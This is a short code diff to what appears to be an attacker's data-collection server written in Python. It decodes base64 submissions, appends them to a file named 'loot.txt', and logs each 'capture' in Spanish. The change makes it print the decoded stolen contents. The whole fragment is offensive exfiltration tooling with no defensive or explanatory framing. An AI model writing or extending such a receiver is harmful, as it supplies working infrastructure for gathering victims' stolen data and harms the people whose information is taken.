@@ -11,7 +11,7 @@ def receive_data():
         decoded_data = base64.b64decode(encoded_data).decode()
         with open("loot.txt", "a") as f:
             f.write(decoded_data)
-        print(f"[+] Captura recibida: {request.remote_addr}")
+        print(f"[+] Captura recibida: {decoded_data}")
     return "OK", 200
 
 if __name__ == "__main__":
